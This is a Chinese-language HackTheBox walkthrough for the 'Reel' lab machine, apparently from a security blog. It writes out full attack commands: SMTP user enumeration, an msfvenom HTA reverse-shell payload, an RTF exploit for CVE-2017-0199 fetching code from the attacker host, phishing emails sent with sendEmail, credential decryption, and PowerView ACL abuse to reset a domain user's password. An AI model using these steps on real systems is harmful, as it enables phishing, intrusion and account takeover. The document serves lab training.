Reel是一个困难的靶机，知识点涉及smtp用户名枚举、rtf邮件钓鱼、xml凭据恢复、管理员组添加等。感兴趣的同学可以在HackTheBox中进行学习。

![截屏2021-11-08
上午2.05.51](https://image.3001.net/images/20221108/1667914269_636a5a1d62f487710e728.png!small)  
 _通关思维导图_  
![Reel](https://image.3001.net/images/20221108/1667914271_636a5a1fb9e13a146c015.png!small)

## 0x01 侦查

### 端口探测

首先通过nmap对目标进行端口扫描

    
    
    nmap -Pn -p- -sV -sC -A 10.10.10.77 -oA nmap_Reel
    

![截屏2021-11-08
上午10.14.13](https://image.3001.net/images/20221108/1667914273_636a5a21bc7fcae7bbaa4.png!small)  
扫描结果显示目标开放了21、22、25端口

#### 21端口

利用匿名登录漏洞可直接登陆目标 FTP 服务

    
    
    ftp 10.10.10.77
    ## 账号/密码：anonymous/anonymous
    

![截屏2021-11-08
上午11.30.37](https://image.3001.net/images/20221108/1667914275_636a5a23c85d5a4dbb382.png!small)

### ftp信息收集

进入`documents`目录并尝试下载所有文件

    
    
    ftp > cd documents
    ftp > ls
    ftp > get readme.txt
    ftp > get AppLocker.docx
    ftp > get "Windows Event Forwarding.docx"
    

![截屏2021-11-08
上午11.33.46](https://image.3001.net/images/20221108/1667914277_636a5a25c7cfbc19c8d90.png!small)  
![截屏2021-11-08
上午11.34.18](https://image.3001.net/images/20221108/1667914279_636a5a27adeb1d4af97a9.png!small)

经翻译后三个文件内容分别如下：

  * AppLocker.docx：要记录的 AppLocker 程序 - exe、msi 和脚本（ps1、vbs、cmd、bat、js）的哈希规则有效

  * readme.txt：请给我发电子邮件任何 rtf 格式程序 - 我会审查和转换。新格式/转换后的文件将保存在这里

  * Windows Event Forwarding.docx：记录了日志转发命令

使用 exiftool 分别查看元数据，在文档`Windows Event
Forwarding.docx`中发现邮箱地址`nico@megabank.com`

    
    
    exiftool "Windows Event Forwarding.docx"
    

![截屏2021-11-08
下午2.30.45](https://image.3001.net/images/20221108/1667914281_636a5a2960180c32a84b7.png!small)

## 0x02 上线[nico]

### smtp用户名枚举

目标存在 smtp 服务，因此可尝试通过用户枚举来获取邮箱用户。枚举 smtp 用户存在以下三种模式：

    
    
    VERY：验证邮箱是否存在
    EXPN：验证邮箱列表是否存在
    RCPT TO：指定收件人地址
    

#### 手动枚举

验证发现的邮箱账户`nico@megabank.com`，使用`vrfy`、`expn`命令查询该账户失败

    
    
    telnet 10.10.10.77 25
    > HELO
    > HELO mac
    > VRFY nico@megabank.com
    > EXPN nico@megabank.com
    

![截屏2021-11-08
下午4.05.31](https://image.3001.net/images/20221108/1667914283_636a5a2b4e612fb7a14fc.png!small)

而使用`rcpt to`命令验证显示该账户存在

    
    
    > mali from a@abc.com
    > rcpt to:nico@megabank.com
    > rcpt to:root@aaa.com
    > rcpt to:a@megabank.com
    > rcpt to:root@megabank.com
    

![截屏2021-11-08
下午4.00.17](https://image.3001.net/images/20221108/1667914284_636a5a2cf2ac26106c8b0.png!small)

#### 自动枚举

使用自动化的 SMTP
用户名枚举工具能够极大地提升效率，当然前提是要存在相应的字典文件，通过对`nico`、`@htb`、`@megabank`这几个关键变量进行变形后构造用户名字典`user.txt`如下：

    
    
    reel
    administrator
    admin
    root
    reel@htb
    reel@htb.local
    reel@reel.htb
    administrator@htb
    admin@htb
    root@htb
    sadfasdfasdfasdf@htb
    nico@megabank.com
    htb@metabank.com
    

使用 smtp-user-enum 对用户名仅需部分自动枚举，结果显示只有`@htb`账户和目标邮箱账户`nico@megabank.com`都存在。

    
    
    smtp-user-enum -M RCPT -U user.txt -t 10.10.10.77
    

![截屏2021-11-08
下午4.54.17](https://image.3001.net/images/20221108/1667914286_636a5a2e735cd7ddb3570.png!small)

### 邮件钓鱼

在`readme.txt`中提示可发送 rtf 格式的文件，而利用 rtf 可执行 RCE 漏洞（CVE-2017-0199），漏洞详细利用步骤如下：

    
    
    1、向目标用户发送恶意的 rtf 文件
    2、在易受攻击的 word 版本中打开该文件将导致代码执行，恶意代码存在于 olelink 对象中
    3、当打开文档后 winword.exe 会向远程服务器发送 http 请求以检索恶意的 HTA 文件
    4、收到响应的则是一个带有恶意脚本的假的 rtf 文件，winword.exe 通过 COM 对象查找 application/hta 的文件处理程序
    5、导致 Microsoft HTA 应用程序（mshta.exe）下载并执行包含 Powershell 命令的 Visual Basic 脚本
    

简单来说就是向目标发送带有恶意 rtf 的邮件，用户一旦打开 rtf 文件后就会加载远程的恶意 hta 文件处理程序并执行相应命令。

#### 生成恶意hta文件

使用 msf 生成 hta 类型的反弹shell木马

    
    
    msfvenom -p windows/shell_reverse_tcp lhost=10.10.14.17 lport=2222 -f hta-psh -o msfv.hta
    

![截屏2021-11-08
下午11.36.11](https://image.3001.net/images/20221108/1667914288_636a5a3022437cccdb713.png!small)

#### 生成请求恶意hta的rtf文件

使用 github 上的漏洞利用工具来生成 rtf 文件，该工具的相关命令参数如下：

 **工具地址：https://github.com/bhdresh/CVE-2017-0199**

![截屏2021-11-08
下午9.58.05](https://image.3001.net/images/20221108/1667914289_636a5a31a2655ab067ca2.png!small)

成功生成用于请求远程 hta 程序的 rtf 文件

    
    
    python cve-2017-0199_toolkit.py -M gen -w mac.rtf -u http://10.10.14.17/msfv.hta -t rtf -x 0
    

![截屏2021-11-08
下午11.42.40](https://image.3001.net/images/20221108/1667914291_636a5a337c91e5698a260.png!small)

使用 python 开启 http 服务

    
    
    python -m SimpleHTTPServer 80
    

同时监听 2222 端口用于接收反弹shell

    
    
    nc -nvlp 2222
    

#### 发送邮件获取权限

通过 sendemail 向目标邮件账户发送带有恶意 rtf 文件的邮件，等待用户打开邮件

    
    
    sendEmail -f mac@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a mac.rtf -s 10.10.10.77 -v 
    

![截屏2021-11-09
上午12.25.25](https://image.3001.net/images/20221108/1667914292_636a5a34e8a90ebd4bc9c.png!small)

过一段时间后成功拿到反弹shell  
![截屏2021-11-09
上午12.27.49](https://image.3001.net/images/20221108/1667914294_636a5a3678a52b69393cf.png!small)

在当前用户桌面上成功拿到第一个flag

    
    
    dir c:\Users\nico\Desktop
    type c:\Users\nico\Desktop\user.txt
    

![截屏2021-11-09
上午12.38.45](https://image.3001.net/images/20221108/1667914296_636a5a3841f4ff3e3ec6d.png!small)

### msf利用

当然也可以使用 MSF 来完成以上操作

    
    
    msfconsole 
    msf > use exploit/windows/fileformat/office_word_hta
    msf > set lhost 10.10.14.17
    msf > set lport 4444
    msf > set srvhost 10.10.14.17
    msf > run
    

![截屏2021-11-09
上午1.31.03](https://image.3001.net/images/20221108/1667914297_636a5a39be1f08da851b0.png!small)

向目标用户发送钓鱼邮件

    
    
    sendEmail -f mac@megabank.com -t nico@megabank.com -u "Invoice Attached" -m "You are overdue payment" -a /root/.msf4/local/msf.doc -s 10.10.10.77 -v 
    

![截屏2021-11-09
上午1.19.05](https://image.3001.net/images/20221108/1667914299_636a5a3b686146c16fec5.png!small)

成功收到 meterpreter  
![截屏2021-11-09
上午1.32.26](https://image.3001.net/images/20221108/1667914300_636a5a3cd211bf59a2321.png!small)

## 0x03 权限提升[tom]

### 凭据恢复

在当前用户桌面上发现敏感文件`cred.xml`，该文件是 PSCredential 对象当中`Export-CliXml`方法输出的 XML 文档，而
PSCredential 对象在 Powershell 中主要用于存储用户名、密码和凭据

    
    
    type c:\Users\nico\Desktop\cred.xml
    

![截屏2021-11-09
上午1.33.34](https://image.3001.net/images/20221108/1667914302_636a5a3e64cc9ebef85cd.png!small)

使用 PSCredential 对象中的`Import-CliXml`方法导入该文件，调用`GetNetworkCredential`方法可从中直接提取明文密码，成功拿到账号密码`Tom/1ts-mag1c!!!`

    
    
    powershell -c "$cred = Import-CliXml -Path c:\Users\nico\Desktop\cred.xml;$cred.GetNetworkCredential() | Format-List *"
    

![截屏2021-11-09
上午1.41.06](https://image.3001.net/images/20221108/1667914303_636a5a3fe6a9b2ee3ebc9.png!small)

### ssh登录

使用拿到的账号密码登录目标 SSH 服务

    
    
    ssh tom@10.10.10.77
    

![截屏2021-11-09
上午1.46.04](https://image.3001.net/images/20221108/1667914305_636a5a4142c1c9f79b10b.png!small)

进入该用户桌面后在`AD Audit\BloodHound\Ingestors`目录中找到`acls.csv`文件

    
    
    cd "C:\Users\tom\Desktop\AD Audit\BloodHound\Ingestors"
    dir
    

![截屏2021-11-09
上午1.48.42](https://image.3001.net/images/20221108/1667914306_636a5a42a0037427c5580.png!small)

## 0x04 权限提升[claire]

### csv信息收集

在本地搭建 SMB 服务用于文件传输

    
    
    python3 smbserver.py mac ~/hackthebox/Machines/Reel 
    

![截屏2021-11-09
上午1.54.04](https://image.3001.net/images/20221108/1667914308_636a5a445eabf3b1e9f3a.png!small)

利用 SMB 协议下载该文件到本地

    
    
    copy acls.csv \\10.10.14.17\mac
    

![截屏2021-11-09
上午1.56.45](https://image.3001.net/images/20221108/1667914309_636a5a45cbadfa5d17dd8.png!small)

打开 csv 表格文件后发现其中包含了域中各个用户以及用户组之间的关系  
![截屏2021-11-09
上午1.59.20](https://image.3001.net/images/20221108/1667914311_636a5a474e5e684394181.png!small)

经搜索后发现当前用户`tom`对用户`claire`拥有`WriteOwner`权限  
![截屏2021-11-09
上午2.01.14](https://image.3001.net/images/20221108/1667914312_636a5a48e7ecd8a416dbd.png!small)

用户`claire`又对`Backup_Admins`组对象拥有`WriteDacl`权限，因此拥有用户`tom`的权限就可以控制用户`claire`并最终拿到`Backup_Admins`用户组权限  
![截屏2021-11-09
上午2.02.53](https://image.3001.net/images/20221108/1667914314_636a5a4a203247502f5f6.png!small)

### BloodHound表格分析

BloodHound 可对大型域环境进行分析并将其可视化输出，如果未安装可使用以下命令进行安装

    
    
    apt install bloodhound
    

安装完后开启 neo4j 数据库，如果出现以下报错  
![截屏2021-11-09
上午9.13.11](https://image.3001.net/images/20221108/1667914315_636a5a4b81277d446caee.png!small)

出现报错创建`log`目录和对应日志`neo4j.log`

    
    
    mkdir /usr/share/neo4j/logs
    touch /usr/share/neo4j/logs/neo4j.log
    

再次开启 neo4j 数据库

    
    
    neo4j start
    

![截屏2021-11-09
上午9.18.15](https://image.3001.net/images/20221108/1667914317_636a5a4d03de22a2eec13.png!small)

使用默认账号密码登录 BloodHound

    
    
    username: neo4j
    password: neo4j
    

![截屏2021-11-09
上午9.21.24](https://image.3001.net/images/20221108/1667914318_636a5a4e7743020e71dba.png!small)

首次登录需要重新设置密码。在其中上传数据可寻找域内各个用户、用户组的对应关系  
![截屏2021-11-09
上午9.57.28](https://image.3001.net/images/20221108/1667914319_636a5a4fa49ddc9c08333.png!small)

### 修改claire用户密码

导入 PowerSploit 中的`powerview.ps1`

    
    
    powershell //切换到powershell命令行
    . .\PowerView.ps1 //将PowerView导入
    

把当前用户`tom`设置为`claire`用户的 ACL 的所有者并授予其修改密码的权限

    
    
    Set-DomainObjectOwner -identity claire -OwnerIdentity tom
    Add-DomainObjectAcl -TargetIdentity claire -PrincipalIdentity tom -Rights ResetPassword
    

设置`claire`的密码为`MagicMac123!@#`

    
    
    $cred = ConvertTo-SecureString "MagicMac123!@#" -AsPlainText -force
    Set-DomainUserPassword -identity claire -accountpassword $cred
    

![截屏2021-11-09
上午2.48.36](https://image.3001.net/images/20221108/1667914320_636a5a50ed31922a40163.png!small)

### ssh登陆

使用重新设置的密码登录用户`claire`

    
    
    ssh claire@10.10.10.17
    

![截屏2021-11-09
上午2.54.38](https://image.3001.net/images/20221108/1667914322_636a5a526991d930e992d.png!small)

查看`backup_admins`组成员，目前该组中只有`ranj`用户

    
    
    net group backup_admins
    

![截屏2021-11-09
上午2.57.13](https://image.3001.net/images/20221108/1667914323_636a5a53bc32a0e348cfd.png!small)

成功将`claire`用户添加到`backup_admins`用户组下，不过需重新登录，否则无法生效

    
    
    net group backup_admins claire /add
    net group backup_admins
    

![截屏2021-11-09
上午2.58.41](https://image.3001.net/images/20221108/1667914325_636a5a557d583de94cd0d.png!small)

## 0x05 权限提升[administrator]

### 信息收集

查看当前用户对管理员目录`c:\users\administrator`的权限，发现`Backup_Admins`组对管理员目录拥有访问权限

    
    
    icalcs Administrator
    

![截屏2021-11-09
上午3.37.11](https://image.3001.net/images/20221108/1667914327_636a5a574d2964af00617.png!small)

因此可直接查看管理员用户桌面中的文件，成功发现第二个 flag

    
    
    cd c:\Users\Administrator\Desktop
    ls
    

![截屏2021-11-09
上午3.37.32](https://image.3001.net/images/20221108/1667914329_636a5a5973a72f6852edf.png!small)

但尝试查看`root.txt`却被拒绝

    
    
    type root.txt
    

![截屏2021-11-09
上午3.37.57](https://image.3001.net/images/20221108/1667914332_636a5a5c5c0de7af602c3.png!small)

### 管理员登陆

在备份目录`Backup Scripts`中遍历密码，成功找到管理员密码`Cr4ckMeIfYouC4n!`

    
    
    cd "Back Scripts"
    type * | findstr pass
    

![截屏2021-11-09
上午3.39.13](https://image.3001.net/images/20221108/1667914333_636a5a5d9026f3f9b1588.png!small)

通过该密码可成功登录管理员并拿到第二个flag

    
    
    ssh administrator@10.10.10.77
    

![截屏2021-11-09
上午3.44.25](https://image.3001.net/images/20221108/1667914335_636a5a5f309ef71cf43ad.png!small)

## 0x06 总结

Reel 译为卷轴，它是目前唯一一个需要三次提权的靶机。通过信息收集发现目标存在 FTP 匿名登录漏洞，利用该漏洞登录 FTP 后下载其中的文件，分析
Word 文档的源数据时成功找到一个邮箱账户`nico@megabank.com`，经 SMTP 用户名枚举验证后可知该邮箱账户存在，与此同时 FTP
中的文件还提示可接受 rtf 格式的邮件，因此可将带有恶意 rtf 的钓鱼邮件发送给该邮箱账户。

等待受害者点击后可成功获取用户`nico`的权限。在该用户桌面上发现用户`tom`的账号密码凭据，但其中的密码为密文，借助
GetNetworkCredential
方法可恢复为密码明文。有了`tom`的密码后就能够以`tom`的身份登陆ssh，搜索后发现在该用户桌面上存在反映域内用户与用户组关系的表格，其中显示用户`tom`对用户`claire`拥有`WriteOwner`权限，而用户`claire`对`Backup_Admins`组拥有`WriteDacl`权限。

利用 PowerView
工具可配合用户`tom`的权限修改用户`claire`密码，使用修改后的密码可成功登录用户`claire`，登陆成功后将当前用户添加至`Backup_Admins`用户组当中，而该用户组拥有管理员桌面的访问权限，尝试读取
flag 信息失败，但可读取备份目录中的管理员密码，并最终使用该密码登陆管理员成功。

